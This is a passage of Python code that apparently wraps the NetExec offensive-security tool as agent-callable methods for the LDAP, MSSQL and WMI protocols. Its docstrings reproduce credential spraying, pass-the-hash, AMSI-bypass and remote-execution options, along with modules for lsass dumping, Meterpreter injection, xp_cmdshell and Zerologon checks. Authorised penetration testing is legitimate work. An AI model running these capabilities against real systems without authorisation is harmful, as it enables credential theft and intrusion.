        LOW PRIVILEGE MODULES
        [*] adcs                      Find PKI Enrollment Services in Active Directory and Certificate Templates Names
        [*] daclread                  Read and backup the Discretionary Access Control List of objects. Be careful, this module cannot read the DACLS recursively, see more explanation in the options.
        [*] enum_trusts               Extract all Trust Relationships, Trusting Direction, and Trust Transitivity
        [*] find-computer             Finds computers in the domain via the provided text
        [*] get-desc-users            Get description of the users. May contained password
        [*] get-network               Query all DNS records with the corresponding IP from the domain.
        [*] get-unixUserPassword      Get unixUserPassword attribute from all users in ldap
        [*] get-userPassword          Get userPassword attribute from all users in ldap
        [*] groupmembership           Query the groups to which a user belongs.
        [*] laps                      Retrieves all LAPS passwords which the account has read permissions for.
        [*] ldap-checker              Checks whether LDAP signing and channel binding are required and / or enforced
        [*] maq                       Retrieves the MachineAccountQuota domain-level attribute
        [*] obsolete                  Extract all obsolete operating systems from LDAP
        [*] pre2k                     Identify pre-created computer accounts, save the results to a file, and obtain TGTs for each
        [*] pso                       Module to get the Fine Grained Password Policy/PSOs
        [*] sccm                      Find a SCCM infrastructure in the Active Directory
        [*] subnets                   Retrieves the different Sites and Subnets of an Active Directory
        [*] user-desc                 Get user descriptions stored in Active Directory
        [*] whoami                    Get details of provided user
        </modules>

        Args:
            targets: A list of IPs, ranges, CIDRs, hostnames, or FQDNs.
            args: Additional command line arguments for the command.
            username: Username, list of usernames, or a path to a user file (empty for null session).
            password: Password, list of passwords, or a path to a password file (empty for null session).
            domain: Domain for authentication.
            hash: A single NTLM hash, a list of hashes, or a path to a hash file.
            kerberos: Kerberos ccache file path or AES key for authentication.
        """
        if args is None:
            args = []
        return await self.netexec(
            "ldap",
            targets,
            args=["--verbose", *args],
            username=username,
            password=password,
            domain=domain,
            hash=hash,
            kerberos=kerberos,
        )

    @tool_method(catch=True, variants=["generic", "all"])
    async def netexec_mssql(
        self,
        targets: list[str],
        args: list[str] | None = None,
        *,
        username: str | list[str] | None = None,
        password: str | list[str] | None = None,
        domain: str | None = None,
        hash: str | list[str] | None = None,
        kerberos: str | None = None,
        local_auth: bool = False,
    ) -> str:
        """
        Execute a netexec MSSQL protocol command.

        Usage Examples:
            # Test SQL Server authentication
            await netexec_mssql(
                targets=["sql01.corp.local"],
                args=[],
                username="sa",
                password="SqlPassword123"
            )

            # Execute SQL query with domain auth
            await netexec_mssql(
                targets=["192.168.1.50"],
                args=["-q", "SELECT @@version"],
                username="sqladmin",
                password="pass",
                domain="corp.local"
            )

            # Enumerate SQL logins using local auth
            await netexec_mssql(
                targets=["10.10.10.50"],
                args=["-M", "enum_logins"],
                username="admin",
                password="pass",
                local_auth=True
            )

        <documentation>
        positional arguments:
        target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets, NMap XML or .Nessus file(s)

        options:
        -h, --help            show this help message and exit
        -H, --hash HASH [HASH ...]
                                NTLM hash(es) or file(s) containing NTLM hashes
        --port PORT           MSSQL port (default: 1433)
        --mssql-timeout MSSQL_TIMEOUT
                                SQL server connection timeout (default: 5)
        -q, --query QUERY     execute the specified query against the MSSQL DB
        -d DOMAIN             domain name
        --local-auth          authenticate locally to each target

        Generic:
        Generic options for nxc across protocols

        --version             Display nxc version
        -t, --threads THREADS
                                set how many concurrent threads to use (default: 256)
        --timeout TIMEOUT     max timeout in seconds of each thread
        --jitter INTERVAL     sets a random delay between each authentication

        Output:
        Options to set verbosity levels and control output

        --verbose             enable verbose output
        --debug               enable debug level information
        --no-progress         do not displaying progress bar during scan
        --log LOG             export result into a custom file

        DNS:
        -6                    Enable force IPv6
        --dns-server DNS_SERVER
                                Specify DNS server (default: Use hosts file & System DNS)
        --dns-tcp             Use TCP instead of UDP for DNS queries
        --dns-timeout DNS_TIMEOUT
                                DNS query timeout in seconds (default: 3)

        Authentication:
        Options for authenticating

        -u, --username USERNAME [USERNAME ...]
                                username(s) or file(s) containing usernames
        -p, --password PASSWORD [PASSWORD ...]
                                password(s) or file(s) containing passwords
        -id CRED_ID [CRED_ID ...]
                                database credential ID(s) to use for authentication
        --ignore-pw-decoding  Ignore non UTF-8 characters when decoding the password file
        --no-bruteforce       No spray when using file for username and password (user1 => password1, user2 => password2)
        --continue-on-success
                                continues authentication attempts even after successes
        --gfail-limit LIMIT   max number of global failed login attempts
        --ufail-limit LIMIT   max number of failed login attempts per username
        --fail-limit LIMIT    max number of failed login attempts per host

        Kerberos:
        Options for Kerberos authentication

        -k, --kerberos        Use Kerberos authentication
        --use-kcache          Use Kerberos authentication from ccache file (KRB5CCNAME)
        --aesKey AESKEY [AESKEY ...]
                                AES key to use for Kerberos Authentication (128 or 256 bits)
        --kdcHost KDCHOST     FQDN of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter

        Certificate:
        Options for certificate authentication

        --pfx-cert PFXCERT    Use certificate authentication from pfx file .pfx
        --pfx-base64 PFXB64   Use certificate authentication from pfx file encoded in base64
        --pfx-pass PFXPASS    Password of the pfx certificate
        --pem-cert PEMCERT    Use certificate authentication from PEM file
        --pem-key PEMKEY      Private key for the PEM format

        Servers:
        Options for nxc servers

        --server {https,http}
                                use the selected server (default: https)
        --server-host HOST    IP to bind the server to (default: 0.0.0.0)
        --server-port PORT    start the server on the specified port
        --connectback-host CHOST
                                IP for the remote system to connect back to

        Modules:
        Options for nxc modules

        -M, --module MODULE   module to use
        -o MODULE_OPTION [MODULE_OPTION ...]
                                module options
        -L, --list-modules    list available modules
        --options             display module options

        Command Execution:
        options for executing commands

        --no-output           do not retrieve command output
        -x COMMAND            execute the specified command
        -X PS_COMMAND         execute the specified PowerShell command

        Powershell Options:
        Options for PowerShell execution

        --force-ps32          Force the PowerShell command to run in a 32-bit process via a job; WARNING: depends on the job completing quickly, so you may have to increase the
                                timeout
        --obfs                Obfuscate PowerShell ran on target; WARNING: Defender will almost certainly trigger on this
        --amsi-bypass FILE    File with a custom AMSI bypass
        --clear-obfscripts    Clear all cached obfuscated PowerShell scripts
        --no-encode           Do not encode the PowerShell command ran on target

        Files:
        Options for put and get remote files

        --put-file SRC_FILE DEST_FILE
                                Put a local file into remote target, ex: whoami.txt C:\\Windows\\Temp\\whoami.txt
        --get-file SRC_FILE DEST_FILE
                                Get a remote file, ex: C:\\Windows\\Temp\\whoami.txt whoami.txt

        Mapping/Enumeration:
        Options for Mapping/Enumerating

        --rid-brute [MAX_RID]
                                enumerate users by bruteforcing RIDs
        </documentation>

        <modules>
        LOW PRIVILEGE MODULES
        [*] enum_impersonate          Enumerate users with impersonation privileges
        [*] enum_logins               Enumerate SQL Server logins
        [*] exec_on_link              Execute commands on a SQL Server linked server
        [*] link_enable_xp            Enable or disable xp_cmdshell on a linked SQL server
        [*] link_xpcmd                Run xp_cmdshell commands on a linked SQL server
        [*] mssql_coerce              Execute arbitrary SQL commands on the target MSSQL server
        [*] mssql_priv                Enumerate and exploit MSSQL privileges

        HIGH PRIVILEGE MODULES (requires admin privs)
        [*] empire_exec               Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
        [*] enum_links                Enumerate linked SQL Servers and their login configurations.
        [*] met_inject                Downloads the Meterpreter stager and injects it into memory
        [*] nanodump                  Get lsass dump using nanodump and parse the result with pypykatz
        [*] test_connection           Pings a host
        [*] web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
        </modules>

        Args:
            targets: A list of IPs, ranges, CIDRs, hostnames, or FQDNs.
            args: Additional command line arguments for the command.
            username: Username, list of usernames, or a path to a user file (empty for null session).
            password: Password, list of passwords, or a path to a password file (empty for null session).
            domain: Domain for authentication.
            hash: A single NTLM hash, a list of hashes, or a path to a hash file.
            kerberos: Kerberos ccache file path or AES key for authentication.
            local_auth: Use local authentication (`--local-auth`). Mutually exclusive with `domain`.
        """
        if args is None:
            args = []
        return await self.netexec(
            "mssql",
            targets,
            args=["--verbose", *args],
            username=username,
            password=password,
            domain=domain,
            hash=hash,
            kerberos=kerberos,
            local_auth=local_auth,
        )

    @tool_method(catch=True, variants=["generic", "all"])
    async def netexec_wmi(
        self,
        targets: list[str],
        args: list[str] | None = None,
        *,
        username: str | list[str] | None = None,
        password: str | list[str] | None = None,
        domain: str | None = None,
        hash: str | list[str] | None = None,
        kerberos: str | None = None,
        local_auth: bool = False,
    ) -> str:
        r"""
        Execute a netexec WMI protocol command.

        Usage Examples:
            # Execute command via WMI with password
            await netexec_wmi(
                targets=["192.168.1.20"],
                args=["-x", "whoami"],
                username="administrator",
                password="Password123"
            )

            # Query WMI for system info with domain auth
            await netexec_wmi(
                targets=["pc01.corp.local"],
                args=["--wmi", "SELECT * FROM Win32_OperatingSystem"],
                username="user",
                password="pass",
                domain="corp.local"
            )

            # Check multiple hosts using local auth
            await netexec_wmi(
                targets=["192.168.1.10-20"],
                args=[],
                username="admin",
                password="pass",
                local_auth=True
            )

        <documentation>
        positional arguments:
        target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets, NMap XML or .Nessus file(s)

        options:
        -h, --help            show this help message and exit
        -H, --hash HASH [HASH ...]
                                NTLM hash(es) or file(s) containing NTLM hashes
        --port {135}          WMI port (default: 135)
        --rpc-timeout RPC_TIMEOUT
                                RPC/DCOM(WMI) connection timeout, default is 2 seconds
        -d DOMAIN             Domain to authenticate to
        --local-auth          Authenticate locally to each target

        Generic:
        Generic options for nxc across protocols

        --version             Display nxc version
        -t, --threads THREADS
                                set how many concurrent threads to use
        --timeout TIMEOUT     max timeout in seconds of each thread
        --jitter INTERVAL     sets a random delay between each authentication

        Output:
        Options to set verbosity levels and control output

        --verbose             enable verbose output
        --debug               enable debug level information
        --no-progress         do not displaying progress bar during scan
        --log LOG             export result into a custom file

        DNS:
        -6                    Enable force IPv6
        --dns-server DNS_SERVER
                                Specify DNS server (default: Use hosts file & System DNS)
        --dns-tcp             Use TCP instead of UDP for DNS queries
        --dns-timeout DNS_TIMEOUT
                                DNS query timeout in seconds

        Authentication:
        Options for authenticating

        -u, --username USERNAME [USERNAME ...]
                                username(s) or file(s) containing usernames
        -p, --password PASSWORD [PASSWORD ...]
                                password(s) or file(s) containing passwords
        -id CRED_ID [CRED_ID ...]
                                database credential ID(s) to use for authentication
        --ignore-pw-decoding  Ignore non UTF-8 characters when decoding the password file
        --no-bruteforce       No spray when using file for username and password (user1 => password1, user2 => password2)
        --continue-on-success
                                continues authentication attempts even after successes
        --gfail-limit LIMIT   max number of global failed login attempts
        --ufail-limit LIMIT   max number of failed login attempts per username
        --fail-limit LIMIT    max number of failed login attempts per host

        Kerberos:
        Options for Kerberos authentication

        -k, --kerberos        Use Kerberos authentication
        --use-kcache          Use Kerberos authentication from ccache file (KRB5CCNAME)
        --aesKey AESKEY [AESKEY ...]
                                AES key to use for Kerberos Authentication (128 or 256 bits)
        --kdcHost KDCHOST     FQDN of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter

        Certificate:
        Options for certificate authentication

        --pfx-cert PFXCERT    Use certificate authentication from pfx file .pfx
        --pfx-base64 PFXB64   Use certificate authentication from pfx file encoded in base64
        --pfx-pass PFXPASS    Password of the pfx certificate
        --pem-cert PEMCERT    Use certificate authentication from PEM file
        --pem-key PEMKEY      Private key for the PEM format

        Servers:
        Options for nxc servers

        --server {https,http}
                                use the selected server
        --server-host HOST    IP to bind the server to
        --server-port PORT    start the server on the specified port
        --connectback-host CHOST
                                IP for the remote system to connect back to

        Modules:
        Options for nxc modules

        -M, --module MODULE   module to use
        -o MODULE_OPTION [MODULE_OPTION ...]
                                module options
        -L, --list-modules    list available modules
        --options             display module options

        Mapping/Enumeration:
        Options for Mapping/Enumerating

        --wmi QUERY           Issues the specified WMI query
        --wmi-namespace NAMESPACE
                                WMI Namespace (default: root\cimv2)

        Command Execution:
        Options for executing commands

        --no-output           do not retrieve command output
        -x COMMAND            Creates a new cmd process and executes the specified command with output
        --exec-method {wmiexec,wmiexec-event}
                                method to execute the command. (default: wmiexec). [wmiexec (win32_process + StdRegProv)]: get command results over registry instead of using smb connection. [wmiexec-event (T1546.003)]: this method is
                                not very stable, highly recommend use this method in single host, using on multiple hosts may crash (just try again if it crashed).
        --exec-timeout exec_timeout
                                Set timeout (in seconds) when executing a command, minimum 5 seconds is recommended. Default: 5
        --codec CODEC         Set encoding used (codec) from the target's output (default: utf-8). If errors are detected, run chcp.com at the target & map the result with https://docs.python.org/3/library/codecs.html#standard-
                                encodings and then execute again with --codec and the corresponding codec
        </documentation>

        <modules>
        LOW PRIVILEGE MODULES
        [*] ioxidresolver             This module helps you to identify hosts that have additional active interfaces
        [*] spooler                   Detect if print spooler is enabled or not
        [*] zerologon                 Module to check if the DC is vulnerable to Zerologon aka CVE-2020-1472

        HIGH PRIVILEGE MODULES (requires admin privs)
        [*] bitlocker                 Enumerating BitLocker Status on target(s) If it is enabled or disabled.
        [*] enum_dns                  Uses WMI to dump DNS from an AD DNS Server
        [*] get_netconnections        Uses WMI to query network connections.
        [*] rdp                       Enables/Disables RDP
        </modules>

        Args:
            targets: A list of IPs, ranges, CIDRs, hostnames, or FQDNs.
            args: Additional command line arguments for the command.
            username: Username, list of usernames, or a path to a user file (empty for null session).
            password: Password, list of passwords, or a path to a password file (empty for null session).
            domain: Domain for authentication.
            hash: A single NTLM hash, a list of hashes, or a path to a hash file.
            kerberos: Kerberos ccache file path or AES key for authentication.
            local_auth: Use local authentication (`--local-auth`). Mutually exclusive with `domain`.
        """
        if args is None:
            args = []
        return await self.netexec(
            "wmi",
            targets,
            args=["--verbose", *args],
            username=username,
            password=password,
            domain=domain,
            hash=hash,
            kerberos=kerberos,
            local_auth=local_auth,
        )
